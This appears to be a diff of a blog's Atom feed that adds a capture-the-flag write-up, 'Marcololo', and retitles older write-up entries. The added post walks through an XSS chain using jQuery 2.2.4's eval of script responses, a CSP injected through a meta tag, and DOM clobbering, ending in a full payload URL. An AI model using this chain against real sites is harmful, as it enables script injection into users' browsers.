@@ -5,7 +5,7 @@
   
   <link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" />
   <link href="http://localhost:4000/" rel="alternate" type="text/html" />
-  <updated>2019-05-29T10:43:51+01:00</updated>
+  <updated>2019-06-16T19:00:17+02:00</updated>
   <id>http://localhost:4000//</id>
 
   
@@ -22,13 +22,137 @@
   
     <entry>
       
-      <title type="html">[CTF Write-up] Midnightsun CTF - Cloudb (web. hard)</title>
+      <title type="html">[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)</title>
       
       
-      <link href="http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF - Cloudb (web. hard)" />
+      <link href="http://localhost:4000/2019/06/15/midnightsunctf-marcololo/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF Finals Marcololo (web. mid)" />
       
-      <published>2019-04-20T13:00:00+01:00</published>
-      <updated>2019-04-20T13:00:00+01:00</updated>
+      <published>2019-06-15T13:00:00+02:00</published>
+      <updated>2019-06-15T13:00:00+02:00</updated>
+      <id>http://localhost:4000/2019/06/15/midnightsunctf-marcololo</id>
+      <content type="html" xml:base="http://localhost:4000/2019/06/15/midnightsunctf-marcololo/">&lt;p&gt;This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.&lt;/p&gt;
+
+&lt;p&gt;Marcololo task had the following statement:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;How slow is your metabolism?
+Service: http://marcololo-01.play.midnightsunctf.se:3001
+Author: avlidienbrunn
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When accesing the challenge website, the following form was shown:&lt;/p&gt;
+
+&lt;p&gt;[image1]&lt;/p&gt;
+
+&lt;p&gt;So it seems we need to submit a URL that triggers an alert(1) using XSS to to this form. Also, it indicates us where the actual challenge is, at &lt;code class=&quot;highlighter-rouge&quot;&gt;http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=marcololo&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This webpage returned the following HTTP response:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+X-Powered-By: Express
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Content-Type: text/html; charset=utf-8
+Content-Length: 390
+ETag: W/&quot;186-zb58dqJWgRpwGL9cKYBdnemMbKQ&quot;
+Date: Sun, 16 Jun 2019 16:16:25 GMT
+Connection: close
+
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/static/style.css&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;property=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;og:title&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;marcololo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://code.jquery.com/jquery-2.2.4.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/api/getuser&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;u are not admin, fak off&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As you can see, if &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name == admin&lt;/code&gt; condition returns true, then, &lt;code class=&quot;highlighter-rouge&quot;&gt;$.get(location.hash.slice(1))&lt;/code&gt; will be executed. This &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; object, came from &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;, this javascript just returned an object with the following attributes: &lt;code class=&quot;highlighter-rouge&quot;&gt;user = {&quot;id&quot;:&quot;-1&quot;, &quot;name&quot;: &quot;guest&quot;, &quot;type&quot;: &quot;guest&quot;}&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash.slice(1)&lt;/code&gt; is the first string before “#” element on the URL.&lt;/p&gt;
+
+&lt;p&gt;But where’s the XSS here?&lt;/p&gt;
+
+&lt;p&gt;Ok, if you see, the &lt;code class=&quot;highlighter-rouge&quot;&gt;input&lt;/code&gt; parameter is being reflected, but unfortunetly, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;,&amp;gt; and /&lt;/code&gt; characters are filtered on the response, so simply injecting &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;&lt;/code&gt; will not work.&lt;/p&gt;
+
+&lt;p&gt;There needs to be another path… Did you notice that jQuery version?, 2.2.4 seems a bit old right? Yes, and it has an XSS vulnerability! Bingo!. On jQuery 2.2.4, if a user GET a resource and the Content-Type response header is &lt;code class=&quot;highlighter-rouge&quot;&gt;text/javascript&lt;/code&gt;, jQuery will simply eval the response as javascript, I developed a quick dummy TCP server that always returns:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.0 200 OK
+Content-Type: text/javascript
+Access-Control-Allow-Origin: *
+
+alert(1)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I tested it on Chrome’s console, doing &lt;code class=&quot;highlighter-rouge&quot;&gt;$.get(&quot;http://&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot;)&lt;/code&gt;, and it worked!! XSS executed!!&lt;/p&gt;
+
+&lt;p&gt;Well, first problem seems to be solved, now we know how to trigger an XSS. But not that fast, now we need to figure out how to bypass that &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name == admin&lt;/code&gt; check.&lt;/p&gt;
+
+&lt;p&gt;If you rememeber, we can reflect on the &lt;code class=&quot;highlighter-rouge&quot;&gt;content=&lt;/code&gt; attribute of the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag, so: How about injecting other meta attributes? Like, for expample, &lt;code class=&quot;highlighter-rouge&quot;&gt;http-equiv&lt;/code&gt; which will let us to mimic a response header. At first, we think that maybe abusing XSS Auditor on filter mode (the default mode on latest Chrome browser versions) could help us on filtering the  &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; so we tried to inject &lt;code class=&quot;highlighter-rouge&quot;&gt;1&quot; http-equiv=&quot;X-XSS-Protection&quot; p=&quot;&lt;/code&gt;, but it doesn’t work, as the server was already setting an &lt;code class=&quot;highlighter-rouge&quot;&gt;X-XSS-Protection&lt;/code&gt; header, an headers always overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;http-quiv&lt;/code&gt; meta tag attribute.&lt;/p&gt;
+
+&lt;p&gt;Then, I realized that injecting a CSP policy constraining current domain scripts but allowing .jquery.com ones, could prevent &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; from loading, but jqeury will be allowed. Also, inline scripts and eval should be allowed, as jQuery bug is triggered beacuse an eval function. Injecting the following CSP header on the meta tag should do the job: &lt;code class=&quot;highlighter-rouge&quot;&gt;default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &quot;&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&lt;/code&gt;. This worked!! Now Chrome is preventing &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script src=&quot;/api/getuser&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;to load, as it comes from &lt;code class=&quot;highlighter-rouge&quot;&gt;http://marcololo-01.play.midnightsunctf.se:3001&lt;/code&gt; and CSP doesn’t allow this URL and also, doesn’t explicity allow &lt;code class=&quot;highlighter-rouge&quot;&gt;'self'&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;But now, &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; doesn’t exists, as this object is not loaded anymore. This can be workarounded using the old friend, Dom Clobbering. If we also inject &lt;code class=&quot;highlighter-rouge&quot;&gt;id=name name=admin&lt;/code&gt; on the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag, javascript will be able to access &lt;code class=&quot;highlighter-rouge&quot;&gt;user.name&lt;/code&gt; attribute, and it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;!!&lt;/p&gt;
+
+&lt;p&gt;We tested it and boom! It worked!!!&lt;/p&gt;
+
+&lt;p&gt;The final URL (without urlencode for legibility) is:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=default-src 'unsafe-eval' 'unsafe-inline' *.jquery.com &amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;&quot; http-equiv=&quot;Content-Security-Policy&quot; id=user name=admin p=&quot;#http://&amp;lt;my-server-ip&amp;gt;:&amp;lt;my-server-port&amp;gt;/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When submitting the flag on the initial form, it shows us the flag.&lt;/p&gt;
+
+&lt;p&gt;Thanks to &lt;code class=&quot;highlighter-rouge&quot;&gt;@avlidienbrunn&lt;/code&gt; for the challenge and kudos to ID-10-T team for being such a great people.&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+        <category term="web" />
+      
+        <category term="ctf" />
+      
+        <category term="xss" />
+      
+        <category term="clobbering" />
+      
+
+      
+
+      
+        <summary type="html">This weekend, Midnightsun CTF Finals took place, a really funny CTF in Stockholm, a lovely place to visit.</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">[CTF Write-up] Midnightsun CTF Quals- Cloudb (web. hard)</title>
+      
+      
+      <link href="http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF Quals- Cloudb (web. hard)" />
+      
+      <published>2019-04-20T14:00:00+02:00</published>
+      <updated>2019-04-20T14:00:00+02:00</updated>
       <id>http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb</id>
       <content type="html" xml:base="http://localhost:4000/2019/04/20/midnisghtsunctf-cloudb/">&lt;p&gt;This weekend, my mates of ID-10-T Team and I decided to play the Midnightsun CTF, we had a long time without playing CTFs so it was nice to meet again and solve some challenges.&lt;/p&gt;
 
@@ -213,13 +337,13 @@ lo tengo (I got it)
   
     <entry>
       
-      <title type="html">[CTF Write-up] Midnightsun CTF - Bigspin (web. mid)</title>
+      <title type="html">[CTF Write-up] Midnightsun CTF Quals- Bigspin (web. mid)</title>
       
       
-      <link href="http://localhost:4000/2019/04/20/midnightsunctf-bigspin/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF - Bigspin (web. mid)" />
+      <link href="http://localhost:4000/2019/04/20/midnightsunctf-bigspin/" rel="alternate" type="text/html" title="[CTF Write-up] Midnightsun CTF Quals- Bigspin (web. mid)" />
       
-      <published>2019-04-20T12:00:00+01:00</published>
-      <updated>2019-04-20T12:00:00+01:00</updated>
+      <published>2019-04-20T13:00:00+02:00</published>
+      <updated>2019-04-20T13:00:00+02:00</updated>
       <id>http://localhost:4000/2019/04/20/midnightsunctf-bigspin</id>
       <content type="html" xml:base="http://localhost:4000/2019/04/20/midnightsunctf-bigspin/">&lt;p&gt;This weekend, my mates of ID-10-T Team and I decided to play the Midnightsun CTF, we had a long time without playing CTFs so it was nice to meet again and solve some challenges.&lt;/p&gt;
 
@@ -378,8 +502,8 @@ and by auth_request and  mirror directives; requests changed by the rewrite dire
       
       <link href="http://localhost:4000/2018/10/08/secadmin-reversing-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] Secadmin El Ninja contrareloj (rev. easy)" />
       
-      <published>2018-10-08T13:02:44+01:00</published>
-      <updated>2018-10-08T13:02:44+01:00</updated>
+      <published>2018-10-08T14:02:44+02:00</published>
+      <updated>2018-10-08T14:02:44+02:00</updated>
       <id>http://localhost:4000/2018/10/08/secadmin-reversing-writeup</id>
       <content type="html" xml:base="http://localhost:4000/2018/10/08/secadmin-reversing-writeup/">&lt;p&gt;Last week, &lt;a href=&quot;https://www.secadmin.es/&quot;&gt;Secadmin&lt;/a&gt; conference was held with some easy CTF challenges about crypto, web and reversing. This write-ups is for “El Ninja Contrareloj” challenge, a reversing one.&lt;/p&gt;
 
@@ -705,8 +829,8 @@ TR2 -&amp;gt; 0x57 = 0x57 ^ 0x67 ^ 0x80 -&amp;gt; 0xffffffb0
       
       <link href="http://localhost:4000/2018/10/08/reversing-crystal-binaries/" rel="alternate" type="text/html" title="Brief introduction on reverse engineering Crystal binaries." />
       
-      <published>2018-10-08T13:02:44+01:00</published>
-      <updated>2018-10-08T13:02:44+01:00</updated>
+      <published>2018-10-08T14:02:44+02:00</published>
+      <updated>2018-10-08T14:02:44+02:00</updated>
       <id>http://localhost:4000/2018/10/08/reversing-crystal-binaries</id>
       <content type="html" xml:base="http://localhost:4000/2018/10/08/reversing-crystal-binaries/">&lt;p&gt;Crystal is a “new” Ruby-syntax-based programming language, born in 2014. The main diference is, that this is not a Ruby implementation, this is another compiled programming language, but its syntax is based in ruby, so Crystal != Ruby.&lt;/p&gt;
 
@@ -845,8 +969,8 @@ TR2 -&amp;gt; 0x57 = 0x57 ^ 0x67 ^ 0x80 -&amp;gt; 0xffffffb0
       
       <link href="http://localhost:4000/2018/10/08/nn8ed-hackgym-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] nn8ed HackGym challenge write-up." />
       
-      <published>2018-10-08T13:01:44+01:00</published>
-      <updated>2018-10-08T13:01:44+01:00</updated>
+      <published>2018-10-08T14:01:44+02:00</published>
+      <updated>2018-10-08T14:01:44+02:00</updated>
       <id>http://localhost:4000/2018/10/08/nn8ed-hackgym-writeup</id>
       <content type="html" xml:base="http://localhost:4000/2018/10/08/nn8ed-hackgym-writeup/">&lt;p&gt;This weekend, Navaja Negra 8 CTF started, organized by &lt;a href=&quot;https://www.twitter.com/ka0labs_&quot;&gt;ka0labs.org&lt;/a&gt;. This pwn challenge has the following statement:&lt;/p&gt;
 
@@ -954,8 +1078,8 @@ X-Forwarded-For: XXXXXXXXXXXXXXXXXXXXXXXs
       
       <link href="http://localhost:4000/2018/10/08/nn8ed-tindermon-writeup/" rel="alternate" type="text/html" title="[CTF Write-up] nn8ed Tindermon challenge write-up." />
       
-      <published>2018-10-08T13:00:44+01:00</published>
-      <updated>2018-10-08T13:00:44+01:00</updated>
+      <published>2018-10-08T14:00:44+02:00</published>
+      <updated>2018-10-08T14:00:44+02:00</updated>
       <id>http://localhost:4000/2018/10/08/nn8ed-tindermon-writeup</id>
       <content type="html" xml:base="http://localhost:4000/2018/10/08/nn8ed-tindermon-writeup/">&lt;p&gt;This weekend, Navaja Negra 8 CTF started, organized by &lt;a href=&quot;https://www.twitter.com/ka0labs_&quot;&gt;ka0labs.org&lt;/a&gt;. This web challenge has the following statement:&lt;/p&gt;
 
